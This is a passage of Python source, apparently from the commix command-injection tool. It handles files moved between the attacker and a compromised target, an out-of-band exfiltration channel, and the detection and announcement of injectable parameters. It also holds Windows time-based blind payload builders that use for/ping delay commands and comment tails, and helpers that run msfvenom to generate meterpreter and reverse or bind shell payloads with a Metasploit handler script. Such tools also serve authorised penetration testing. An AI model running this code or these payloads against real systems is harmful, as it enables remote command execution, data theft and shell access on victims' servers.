  if len(args) != 2:
    settings.print_data_to_stdout(settings.print_error_msg("Usage: " + usage))
    return None, None
  return args[0], args[1]

"""
Read a file from the target as base64, so its exact bytes survive the transfer - returns None
when the target cannot produce it (no "base64" available, unreadable file, ...).
"""
def download_file_bytes(execute_cmd, remote_file):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_FILE_READ_B64.format(remote_file.replace("\\", "\\\\"))
  else:
    cmd = settings.FILE_READ_B64 + quoted_cmd(remote_file)
  encoded = execute_cmd(cmd)
  if not encoded:
    return None, False
  try:
    return base64.b64decode("".join(str(encoded).split()), validate=True), True
  except Exception:
    return None, True

"""
Download a file from the target host to the local machine ("download <remote> <local>").
"""
def shell_download(execute_cmd, cmd, filename):
  remote_file, local_file = shell_transfer_args(cmd, "download /path/to/remote/file /path/to/local/file")
  if not remote_file:
    return
  if os.path.isdir(local_file):
    local_file = os.path.join(local_file, os.path.basename(remote_file.replace("\\", "/").rstrip("/")))

  if settings.TIME_RELATED_ATTACK:
    # These techniques recover output character by character and report any they could not
    # get, so base64 would turn a single missing character into a corrupt file - and cost a
    # third more characters to extract.
    warn_msg = "Recovering the output costs several requests per character, so this may take "
    warn_msg += "a while and the file's original formatting is not preserved."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    text = download_file(execute_cmd, remote_file, filename)
    if not text:
      return
    content = str(text).encode(settings.DEFAULT_CODEC, errors="replace")
  else:
    info_msg = "Fetching the contents of the file '" + remote_file + "'."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    content, produced_output = download_file_bytes(execute_cmd, remote_file)
    if content is None and produced_output:
      err_msg = "The contents of '" + remote_file + "' could not be decoded, so the file was not written."
      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
      return
    if content is None:
      # No usable base64 on the target - a plain read costs one more request here.
      text = download_file(execute_cmd, remote_file, filename)
      if not text:
        return
      content = str(text).encode(settings.DEFAULT_CODEC, errors="replace")

  try:
    with open(local_file, "wb") as output_file:
      output_file.write(content)
  except OSError as err:
    err_msg = "Unable to write the local file '" + local_file + "' (" + str(err) + ")."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return

  logs.report_add_file(remote_file, local_file)
  if settings.INCOMPLETE_OUTPUT:
    err_msg = "The file '" + remote_file + "' was written to '" + local_file + "' (" + str(len(content))
    err_msg += " bytes) but is incomplete - the characters listed above are missing from it."
    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    return
  info_msg = "The file '" + remote_file + "' has been successfully downloaded to '" + local_file
  info_msg += "' (" + str(len(content)) + " bytes)."
  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))

"""
Upload a file from the local machine to the target host ("upload <local> <remote>").
"""
def shell_upload(execute_cmd, cmd):
  local_file, remote_file = shell_transfer_args(cmd, "upload /path/to/local/file /path/to/remote/file")
  if not local_file:
    return
  try:
    file_to_write, dest_to_write, content = check_file_to_write(local_file, remote_file)
  except SystemExit:
    return
  upload_file(execute_cmd, file_to_write, dest_to_write, content)

"""
Run the standard file-access checks via the given execute_cmd(cmd) -> output callback - the shared logic behind any module's own file-access entry point (see shellshock.py).
"""
def run_file_access(execute_cmd, filename):
  ran = False

  if menu.options.file_write:
    ran = True
    file_to_write, dest_to_write, content = check_file_to_write()
    upload_file(execute_cmd, file_to_write, dest_to_write, content)

  if menu.options.file_read:
    ran = True
    download_file(execute_cmd, None, filename)

  if ran:
    settings.FILE_ACCESS_DONE = True

# Mark which HTTP header the payload is going into.
def define_vulnerable_http_header(http_header_name):
  if http_header_name == settings.USER_AGENT.lower():
    settings.USER_AGENT_INJECTION = True
  elif http_header_name == settings.REFERER.lower():
    settings.REFERER_INJECTION = True
  elif http_header_name == settings.HOST.lower():
    settings.HOST_INJECTION = True
  return http_header_name

"""
Whether the target actually serves requests concurrently. Parallel timing requests that queue
behind each other make every response look delayed, which silently corrupts a retrieval.
"""
def target_serves_concurrently(url, http_request_method, workers):
  try:
    import concurrent.futures
  except ImportError:
    return False
  sample = lambda _=None: requests.quick_response_time_sample(url, http_request_method)
  # Opening the connections is paid for before either half is timed, so the half that runs second
  # does not simply inherit what the first one warmed up.
  for _ in range(2):
    sample()
  # Enough of them that the two halves differ by more than the cost of starting the workers: a
  # handful of answers on a quick target is over in the time that costs on its own.
  count = max(workers, settings.CONCURRENCY_PROBE_REQUESTS)
  # Both halves are measured the same way, over the same number of requests. Timing one request and
  # multiplying counts the cost of setting the others up as if it were the target's, which on a fast
  # target is the larger half - and every such target then reads as one that answers them in turn.
  start = time.time()
  answered = [_ for _ in (sample() for _ in range(count)) if _ is not None]
  one_after_another = time.time() - start
  if not answered:
    return True
  start = time.time()
  with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
    list(executor.map(sample, range(count)))
  all_at_once = time.time() - start
  # Too quick either way to tell the two apart. Whether the answers can really be told apart under
  # concurrency is settled later anyway, on payloads that carry a delay of their own.
  if one_after_another < settings.CONCURRENCY_PROBE_FLOOR:
    return True
  return all_at_once < one_after_another * 0.5

"""
Decide whether persistent (Keep-Alive) connections are used.
"""
def init_keep_alive():
  reason = None
  if menu.options.no_keep_alive:
    settings.KEEP_ALIVE = False
    return
  if menu.options.http10:
    reason = "the HTTP/1.0 protocol"
  elif menu.options.chunked:
    reason = "chunked transfer-encoding"
  elif menu.options.proxy or menu.options.tor:
    reason = "a proxy"
  elif menu.options.auth_cred and menu.options.auth_type and menu.options.auth_type.lower() == settings.AUTH_TYPE.DIGEST:
    reason = "digest authentication"

  settings.KEEP_ALIVE = reason is None
  if reason and settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Persistent (Keep-Alive) connections were disabled (incompatible with " + reason + ")."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

"""
Bring the out-of-band channel up, once, on first use.
"""
def init_oob_channel():
  if settings.OOB_CHANNEL is not None:
    return settings.OOB_CHANNEL
  settings.OOB_SERVER = menu.options.oob_server or ""
  settings.OOB_TOKEN = menu.options.oob_token or ""
  if menu.options.oob_transport:
    from src.core.techniques.oob import oob_payloads as oob_payloads
    transport = str(menu.options.oob_transport).strip().lower()
    known = oob_payloads.WINDOWS_TRANSPORTS if settings.TARGET_OS == settings.OS.WINDOWS else oob_payloads.UNIX_TRANSPORTS
    if transport not in known:
      err_msg = "The option '--oob-transport' takes one of: " + ", ".join("'" + _ + "'" for _ in known) + "."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
    settings.OOB_TRANSPORT = transport
  for option, attribute in (("--oob-timeout", "OOB_TIMEOUT"), ("--oob-poll", "OOB_POLL_INTERVAL")):
    value = menu.options.oob_timeout if attribute == "OOB_TIMEOUT" else menu.options.oob_poll
    try:
      value = int(value)
    except (TypeError, ValueError):
      value = 0
    if value < 1:
      err_msg = "The option '" + option + "' must be a positive integer number of seconds."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
    setattr(settings, attribute, value)

  # A wait can only observe an interaction if a poll falls inside it, after the interaction lands.
  # Polling no more often than the wait would leave that to chance, and a missed one is not a slow
  # result but a lost finding - '--smart' drops the parameter on a negative heuristic.
  if settings.OOB_POLL_INTERVAL * 2 > settings.OOB_TIMEOUT:
    adjusted = max(1, settings.OOB_TIMEOUT // 2)
    if adjusted != settings.OOB_POLL_INTERVAL:
      warn_msg = "Polling every " + str(settings.OOB_POLL_INTERVAL) + " second"
      warn_msg += "s"[settings.OOB_POLL_INTERVAL == 1:]
      warn_msg += " is too seldom for a " + str(settings.OOB_TIMEOUT) + "-second wait, so "
      warn_msg += "interactions could be missed. Polling every " + str(adjusted) + " second"
      warn_msg += "s"[adjusted == 1:] + " instead."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      settings.OOB_POLL_INTERVAL = adjusted

  from src.core.oob import provider
  channel = provider.build()
  try:
    channel.start()
  except SystemExit:
    raise
  except Exception as err:
    err_msg = provider.tls_error(err) or ("Unable to reach the out-of-band server (" + str(err) + ").")
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()
  settings.OOB_CHANNEL = channel
  # The server is reached over both, so what the payloads use is the target's side of the choice:
  # a host with no TLS of its own, or one that only lets 443 out, needs the other one.
  settings.OOB_SCHEME = channel.scheme
  settings.OOB_PORT = getattr(channel, "port", None)
  if menu.options.oob_scheme:
    scheme = str(menu.options.oob_scheme).strip().lower().rstrip(":/")
    if scheme not in ("http", "https"):
      err_msg = "The option '--oob-scheme' takes either 'http' or 'https'."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()
    settings.OOB_SCHEME = scheme
  settings.OOB_IGNORE_TIMEOUT = True
  notice = channel.server_notice()
  if notice:
    settings.print_data_to_stdout(settings.print_info_msg(notice))
  return channel

"""
Tear the out-of-band channel down.
"""
def close_oob_channel():
  if settings.OOB_CHANNEL is not None:
    if not settings.OOB_CHANNEL.seen_any and settings.OOB_STATE != True:
      warn_msg = "No interaction of any kind reached the out-of-band server, so the channel itself "
      warn_msg += "was never proven to work. Check the target's egress and the channel's settings."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    settings.OOB_CHANNEL.stop()
    settings.OOB_CHANNEL = None

"""
Apply the optimization switches ('-o').
"""
def set_optimize():
  # Persistent connections are already on by default, so only the thread count is left.
  if menu.options.optimize and menu.options.threads is None:
    menu.options.threads = settings.OPTIMIZE_THREADS
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Setting '--threads' to " + str(settings.OPTIMIZE_THREADS) + ", used indirectly by switch '-o'."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  if menu.options.threads is None:
    menu.options.threads = 1

"""
Check for wrong flags
"""
def check_wrong_flags():
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if menu.options.is_root :
      warn_msg = "Identified the target as Windows. Switching "
      warn_msg += "'--is-root' to '--is-admin'."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    if menu.options.passwords:
      warn_msg = "The '--passwords' switch is not yet supported on Windows targets."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  else:
    if menu.options.is_admin :
      warn_msg = "Identified the target as Unix-like. Switching "
      warn_msg += "'--is-admin' to '--is-root'. "
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Set writable path name
"""
def setting_writable_dir(path):
    info_msg = "Attempting to create a file in directory '" + path
    info_msg += "' for execution output. "
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Define python working dir (for windows targets)
"""
def define_py_working_dir():
  if settings.TARGET_OS == settings.OS.WINDOWS and menu.options.interpreter:
    while True:
      message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
      message += "' as default Python interpreter on the target host? [Y/n] "
      python_dir = common.read_input(message, default="Y", check_batch=True)
      if python_dir in settings.CHOICE_YES:
        break
      elif python_dir in settings.CHOICE_NO:
        message = "Please specify the full path to the Python interpreter executable (e.g. '"
        message += settings.WIN_CUSTOM_PYTHON_INTERPRETER + "') "
        custom_interpreter = common.read_input(message, default=settings.WIN_CUSTOM_PYTHON_INTERPRETER, check_batch=True)
        # A blank answer keeps the interpreter already in use, which the payloads concatenate as a string.
        if custom_interpreter and custom_interpreter.strip():
          settings.WIN_PYTHON_INTERPRETER = custom_interpreter.strip()
        break
      else:
        common.invalid_option(python_dir)
        pass
    settings.USER_DEFINED_PYTHON_DIR = True

"""
Checks for identified vulnerable parameter
"""
def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, counter, title=None):
  # Check injection state
  settings.DETECTION_PHASE = False
  settings.EXPLOITATION_PHASE = True
  if settings.COOKIE_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
    found_vuln_parameter = vuln_parameter
    the_type = " parameter"

  elif settings.USER_AGENT_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.USER_AGENT
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.REFERER_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.REFERER
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.HOST_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.HOST
    found_vuln_parameter = ""
    the_type = " HTTP header"

  elif settings.CUSTOM_HEADER_INJECTION == True:
    header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
    found_vuln_parameter = ""
    the_type = " HTTP header"

  else:
    header_name = ""
    the_type = " parameter"
    # Check if defined POST data
    if not settings.USER_DEFINED_POST_DATA or settings.IGNORE_USER_DEFINED_POST_DATA:
      found_vuln_parameter = parameters.vuln_GET_param(url)
    else :
      found_vuln_parameter = vuln_parameter

  if len(found_vuln_parameter) != 0 :
    found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'"

  announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, title=title)

"""
Drop the "command injection"/"injection" filler word from a technique name, for the terse
inline "appears to be injectable via ..." message - the stored/summary form keeps it.
"""
def short_technique_label(technique):
  return technique_display_name(technique).replace("command injection ", "").replace("injection ", "")

"""
Full label of a technique, with its injection type - "classic results-based command injection technique".
"""
def technique_label(injection_type, technique):
  name = short_technique_label(technique)
  if name.endswith(" technique"):
    name = name[:-len(" technique")]
  # The channel belongs with the technique's own name, ahead of the injection type.
  if technique == settings.INJECTION_TECHNIQUE.OOB and oob_channel_label():
    name += " (" + oob_channel_label() + ")"
  # The injection type names the sink as well as how execution shows, and both sinks are reached by
  # the same techniques - so it is given whole, rather than cut down to how execution shows.
  return name + settings.SINGLE_WHITESPACE + injection_type + " technique"

"""
Display name of a technique - a "/tmp/" output file is a file-based mechanism, not its own technique.
"""
def technique_display_name(technique):
  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    return settings.INJECTION_TECHNIQUE.FILE_BASED
  # Reaching an evaluation sink is not a technique of its own - it is the results-based one aimed
  # at different code, and the injection type is what says which sink was reached.
  if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    return settings.INJECTION_TECHNIQUE.CLASSIC
  return technique

"""
Record a newly-identified injectable finding to the log file and terminal - the shared tail of identified_vulnerable_param() above, reusable by modules (see shellshock.py) with their own header_name/the_type.
"""
def announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, type_prefix="", decode_payload=True, title=None):
  display_method = "HTTP Header" if "header" in the_type.lower() else http_request_method
  logs.add_finding(filename, injection_type, technique, display_method, vuln_parameter, payload, title)

  if not settings.LOAD_SESSION:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + type_prefix + technique_label(injection_type, technique) + "."
  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
  announce_leftover_file(technique)
  decoded_payload = str(url_decode(payload)) if decode_payload else payload
  if not settings.LOAD_SESSION:
    settings.CONFIRMED_INJECTION_POINTS.append((technique, injection_type, vuln_parameter, decoded_payload, display_method, settings.TOTAL_OF_REQUESTS, title))

"""
Whether the output file still answers on its URL. Only the file-based technique has one to ask, so
anything else is reported as unconfirmed rather than guessed at.
"""
def output_file_still_served():
  if not settings.DEFINED_WEBROOT:
    return False
  from src.core.requests import requests
  try:
    request = _urllib.request.Request(settings.DEFINED_WEBROOT)
    headers.do_check(request)
    response = requests.get_request_response(request)
    return bool(response) and not isinstance(response, bool)
  except Exception:
    return False

"""
Name the file this technique leaves in the target's document root, and the URL it answers on - it is
written there to carry the command output and is not removed on its own.
"""
def announce_leftover_file(technique):
  if technique != settings.INJECTION_TECHNIQUE.FILE_BASED or not settings.DEFINED_WEBROOT:
    return
  written = settings.WEB_ROOT + settings.DEFINED_WEBROOT.split("/")[-1]
  if written not in settings.LEFTOVER_FILES:
    settings.LEFTOVER_FILES.append(written)

"""
Finalize injection process
"""
def finalize(exit_loops, no_result, i, total, injection_type, technique, shell):
  if exit_loops == False:
    if settings.VERBOSITY_LEVEL == 0:
      # Finished means a shell was found, or every combination was tried without one.
      done = bool(shell) or (no_result and total and i >= total)
      injection_process(injection_type, technique, done=done, i=i, total=total)
    return True
  else:
    return False

"""
Whether a directory path belongs to the operating system currently in use - a root worked out for
one is not a path on the other, and offering it leads to a write that cannot land.
"""
def web_root_matches_os(path):
  if not path:
    return True
  looks_windows = bool(re.match(r"\A[A-Za-z]:[\\/]", path))
  return looks_windows == (settings.TARGET_OS == settings.OS.WINDOWS)

"""
Normalize a directory path for the target OS
"""
def normalize_target_dir(path):
  if not path:
    return path
  if settings.TARGET_OS == settings.OS.WINDOWS:
    path = path.replace("/", "\\")
    if not path.endswith("\\"):
      path += "\\"
  else:
    path = path.replace("\\", "/")
    if not path.endswith("/"):
      path += "/"
  return path

"""
Provide custom server's root directory
"""
def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
  if not settings.CUSTOM_WEB_ROOT:
    # Prefer the already-detected default over the generic one, but only while it still belongs to
    # the operating system in use: the two disagree whenever that was settled after the root was.
    if settings.WEB_ROOT and web_root_matches_os(settings.WEB_ROOT):
      default_root_dir = settings.WEB_ROOT
    elif settings.TARGET_OS == settings.OS.WINDOWS :
      default_root_dir = settings.WINDOWS_DEFAULT_DOC_ROOTS[0]
    else:
      default_root_dir = settings.LINUX_DEFAULT_DOC_ROOTS[0].replace(settings.DOC_ROOT_TARGET_MARK,settings.TARGET_URL)
    message = "Enter a writable directory to use for file operations (e.g. '"
    message += default_root_dir + "') "
    settings.WEB_ROOT = common.read_input(message, default=default_root_dir, check_batch=True)
    if len(settings.WEB_ROOT) == 0:
      settings.WEB_ROOT = default_root_dir
    settings.CUSTOM_WEB_ROOT = True

  if not settings.LOAD_SESSION:
    path = settings.WEB_ROOT
    setting_writable_dir(path)
  menu.options.web_root = settings.WEB_ROOT.strip()


"""
TEMP path for a Windows or Unix-like target, without touching WEB_ROOT or prompting.
"""
def default_tmp_path():
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if "microsoft-iis" in settings.SERVER_BANNER.lower():
      settings.TMP_PATH = "C:\\Windows\\TEMP\\"
    else:
      settings.TMP_PATH = "%temp%\\"
  else:
    settings.TMP_PATH = "/tmp/"
  return normalize_target_dir(menu.options.tmp_path or settings.TMP_PATH)

"""
Return TEMP path for a Windows or Unix-like target.
"""
def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
  tmp_path = default_tmp_path()

  if not settings.LOAD_SESSION and settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT

  settings.CALL_TMP_BASED = False
  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
    settings.CALL_TMP_BASED = True

  if menu.options.web_root:
    settings.WEB_ROOT = menu.options.web_root
  else:
    # Provide custom server's root directory.
    custom_web_root(url, timesec, filename, http_request_method, url_time_response)

  settings.WEB_ROOT = normalize_target_dir(settings.WEB_ROOT)
  menu.options.web_root = settings.WEB_ROOT

  return tmp_path

"""
Check if file-based technique has failed,
then use the "/tmp/" directory for tempfile-based technique.
"""
def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):
  if no_result == True:
    from src.core.techniques.tempfile_based import tfb_handler
    path = tmp_path
    setting_writable_dir(path)
    call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
    if call_tfb == False:
      info_msg = "Resuming the " + settings.INJECTION_TECHNIQUE.FILE_BASED + " tests."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    return call_tfb
  else:
    settings.print_data_to_stdout(settings.END_LINE.CR)

"""
Check if to use the "/tmp/" directory for tempfile-based technique.
"""
def use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response):
  tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
  while True:
    message = "Unable to write to '" + settings.WEB_ROOT + "'. "
    message += "Do you want to use '" + tmp_path + "' instead? [Y/n] "
    tmp_upload = common.read_input(message, default="Y", check_batch=True)
    if tmp_upload in settings.CHOICE_YES:
      settings.TEMPFILE_BASED_STATE = True
      call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
      if call_tfb != False:
        return True
      else:
        if no_result == True:
          return False
        else:
          return True
    elif tmp_upload in settings.CHOICE_NO:
      break
    elif tmp_upload in settings.CHOICE_QUIT:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      raise
    else:
      common.invalid_option(tmp_upload)
      pass
  # continue

"""
Adjusts the timesec delay
"""
def min_safe_timesec():
  # Scale the floor by confirmed instability.
  if settings.UNSTABLE_REQUEST_CHOICE:
    min_safe_delay = settings.MIN_SAFE_TIMESEC_UNSTABLE + settings.UNSTABLE_REQUEST_BUMPS
  else:
    min_safe_delay = settings.MIN_SAFE_TIMESEC
  if settings.URL_TIME_RESPONSE:
    min_safe_delay = max(min_safe_delay, settings.URL_TIME_RESPONSE + settings.TIME_DELAY_STEP * 2)
  return min_safe_delay

"""
Adjusts the timesec delay
"""
def time_related_timesec():
  min_safe_delay = min_safe_timesec()
  if settings.TIME_RELATED_ATTACK and settings.TIMESEC < min_safe_delay:
    if min_safe_delay != settings.REPORTED_MIN_SAFE_TIMESEC:
      settings.REPORTED_MIN_SAFE_TIMESEC = min_safe_delay
      msg = "Adjusting '--time-sec' to minimum safe delay of " + str(min_safe_delay) + " second" + ("s" if min_safe_delay > 1 else "") + ". In case of inconsistencies, it will be auto-increased."
      # A value the user chose is not overridden quietly, whatever the verbosity.
      if settings.USER_APPLIED_TIMESEC:
        settings.print_data_to_stdout(settings.print_warning_msg(msg))
      elif settings.VERBOSITY_LEVEL != 0:
        settings.print_data_to_stdout(settings.print_debug_msg(msg))
    return min_safe_delay
  else:
    return max(settings.TIMESEC, min_safe_delay)

"""
Export the time related injection results
"""
def time_related_export_injection_results(cmd, separator, output, check_exec_time):
  if settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  if output != "" and check_exec_time != 0 :
    info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_exec_time)) + "."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  else:
    # Could be separator filtration on target host, or simply an invalid/wrong command.
    if output != False :
      err_msg = "The '" + cmd + "' command did not return any output. This could be due to "
      err_msg += "'" + separator + "' filtration on the target host, or the command itself "
      err_msg += "being invalid."
      if not menu.options.interpreter:
        err_msg += " If you are confident it is valid, try the '--interpreter' option or another injection technique."
      else:
        err_msg += " If you are confident it is valid, try another injection technique."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    # Check for invalid provided command.
    else:
      err_msg = common.invalid_cmd_output(cmd)
      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    if menu.options.abort_on_empty:
      raise SystemExit()

"""
Success msg.
"""
def shell_success(option):
  info_msg = "Sending selected payload to the target."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))

"""
Payload generation message.
"""
def gen_payload_msg(payload):
  info_msg = "Generating the '" + payload + "' shellcode. "
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  
"""
Error msg if the attack vector is available only for Windows targets.
"""
def windows_only_attack_vector():
    error_msg = "This attack vector is available only for Windows targets."
    settings.print_data_to_stdout(settings.print_error_msg(error_msg))

"""
The operator a Windows payload starts with, or None when the separator does not chain commands in
cmd.exe at all - ';', a newline and Ctrl-Z do not, so there is no payload to build for those.
"""
WINDOWS_SEPARATORS = ("&", "&&", "|", "||", "")

# The separator, where cmd.exe understands it, and nothing where it does not.
def windows_separator(separator):
  return separator if separator in WINDOWS_SEPARATORS else None

"""
Report whether the target's shell runs a second command after this separator at all. A name lookup
can still betray an injection point through one that does not - cmd.exe reads ';' as an argument
separator, so the payload lands as another argument of the target's own command - but nothing can
be run through it afterwards.
"""
def separator_chains(separator):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return windows_separator(separator) is not None
  return True

"""
The operator a payload chains its own commands with, once it has started with the separator under
test. Unconditional, unlike '||' and '|', so every part runs no matter how the first one ended.
"""
WINDOWS_CHAIN = "&"

"""
What a Windows payload ends with when its last token is a filename or a quoted literal. cmd.exe has
no comment character, but 'rem' ignores whatever follows it, so anything the target's own command
line carries after the payload - a closing quote, another argument - lands there instead of inside
that token.
"""
WINDOWS_TAIL = WINDOWS_CHAIN + "rem" + settings.SINGLE_WHITESPACE

"""
The same tail, chained on whatever the payload itself started with. A payload that reaches for a
second separator is blocked wherever only its own one gets through, and the separator then reads as
not injectable.
"""
def windows_tail(chain):
  return chain + "rem" + settings.SINGLE_WHITESPACE

"""
The same, for a POSIX shell: '#' starts a comment, so an unterminated quote or a leftover argument
after the payload is read as one too, instead of swallowing the payload's own last token.
"""
UNIX_TAIL = settings.SINGLE_WHITESPACE + settings.COMMENT

"""
End a payload so that whatever the target's own command line carries after it is ignored.
"""
def shell_tail():
  return WINDOWS_TAIL if settings.TARGET_OS == settings.OS.WINDOWS else UNIX_TAIL

"""
Hold the answer back for a number of seconds, without starting a PowerShell process.

'ping' waits about a second between echoes, so one more than the delay takes that many seconds. It
is on every Windows, including the versions that have no 'timeout' command, and it starts at once -
where a PowerShell launch costs a second or two of its own and varies from call to call, which is
noise a timing measurement cannot afford.
"""
def windows_sleep(timesec):
  return ("ping -n " + str(int(timesec) + 1) + settings.SINGLE_WHITESPACE + "127.0.0.1"
          + settings.SINGLE_WHITESPACE + ">nul")

"""
Whether the decision payload holds the answer back for one candidate length alone. The Windows one
compares the marker straight back instead of measuring its length, so every candidate is answered
the same way - and the shape of a sample of those says nothing about a false positive.
"""
def decision_is_length_based():
  return settings.TARGET_OS != settings.OS.WINDOWS

"""
The delay a time-related payload asks the target for, in seconds. The same on either target: the
answer is told apart from an undelayed one by a threshold that sits just above the target's own
response times, so seconds beyond that are paid on every probe of every character for nothing.
"""
def injected_delay(timesec):
  return int(timesec)

"""
Read a value off a Windows command and hold the answer back when it stands in the given relation
('EQU', 'GEQ', ...) to the expected one.
"""
def windows_probe(chain, cmd, operator, expected, timesec):
  # Quoted, so that an operator inside the command stays part of it - but left alone when the
  # command carries double quotes of its own, which cmd.exe would then pair up with the added ones.
  if "\"" not in cmd:
    cmd = "\"" + cmd + "\""
  # The tail matters more here than anywhere else: the delay is asked for by a command that ends in
  # a redirection, and a closing quote the target's own command line carries after it would be read
  # as part of the redirect's filename - which fails, so the delay never happens and the answer
  # comes back on time as if nothing had been injected.
  # Run through 'cmd /c', or the comparison is lost whenever the payload starts on a pipe: the shell
  # a pipe spawns for its right-hand side has no command extensions, and 'EQU'/'GEQ' are one - the
  # test then never runs, no delay is asked for, and the separator reads as not injectable.
  return (chain +
          "for /f \"tokens=* eol=\" %i in ('cmd /c " + cmd + "') do cmd /c if %i " + operator +
          settings.SINGLE_WHITESPACE + str(expected) + settings.SINGLE_WHITESPACE +
          windows_sleep(timesec) + windows_tail(chain))

"""
Report whether an interaction carries the result of the sum the payload asked the target to work
out. Without a sum to check, any interaction counts.
"""
def oob_proof_holds(interactions, expected):
  if not expected:
    return bool(interactions)
  for interaction in interactions:
    lines = (interaction.raw_request or "").splitlines()
    # Only the request line, so that a number appearing in a header cannot stand in for the result.
    if lines and expected in lines[0]:
      return True
  return False

"""
Return the body of a raw HTTP request captured by an out-of-band server.
"""
def oob_request_body(raw_request):
  if not raw_request:
    return ""
  for delimiter in ("\r\n\r\n", "\n\n"):
    if delimiter in raw_request:
      return raw_request.split(delimiter, 1)[1]
  return ""

"""
Append the separator once more if a custom injection marker changed where the payload lands - the shared tail repeated across every payloads.py.
"""
def append_custom_marker(payload, separator):
  if settings.CUSTOM_INJECTION_MARKER:
    return payload + separator
  return payload

"""
Rewrite LF characters in a file-based payload for header-based injection modes, or CRLF-normalize for non-Windows targets - the shared "new line fixation" logic in fb_payloads.py.
"""
def fix_newlines_for_headers(payload, separator):
  if settings.USER_AGENT_INJECTION or settings.REFERER_INJECTION or settings.HOST_INJECTION or settings.CUSTOM_HEADER_INJECTION:
    return payload.replace(settings.END_LINE.LF, separator)
  if settings.TARGET_OS != settings.OS.WINDOWS:
    return payload.replace(settings.END_LINE.LF, settings.END_LINE.CR)
  return payload

"""
Generate an msfvenom payload and write its multi/handler .rc launcher, returning the payload's raw output - the shared logic behind bind_tcp.py's/reverse_tcp.py's PHP and Python meterpreter/bind shell options.
"""
def generate_msf_payload(payload, output, host_key, host_value, extra_msfvenom_args, strip_newlines):
  subprocess.Popen(
    "msfvenom -p " + str(payload) +
    " " + host_key + "=" + str(host_value) +
    " LPORT=" + str(settings.LPORT) +
    extra_msfvenom_args + " -o " + output + settings.NO_OUTPUT,
    shell=True
  ).wait()

  with open(output, "r+" if strip_newlines else "r") as content_file:
    data = ''.join(content_file.readlines())
    if strip_newlines:
      data = data.replace(settings.END_LINE.LF, settings.SINGLE_WHITESPACE)

  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  os.remove(output)

  with open(output, 'w+') as filewrite:
    filewrite.write(
      "use exploit/multi/handler" + settings.END_LINE.LF +
      "set payload " + payload + settings.END_LINE.LF +
      "set " + host_key.lower() + " " + str(host_value) + settings.END_LINE.LF +
      "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
      "exploit" + settings.END_LINE.LF * 2
    )
  return data

"""
Message regarding the MSF handler.
"""
def msf_launch_msg(output):
    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    info_msg = "Once the loading finishes, press any key here to continue..."
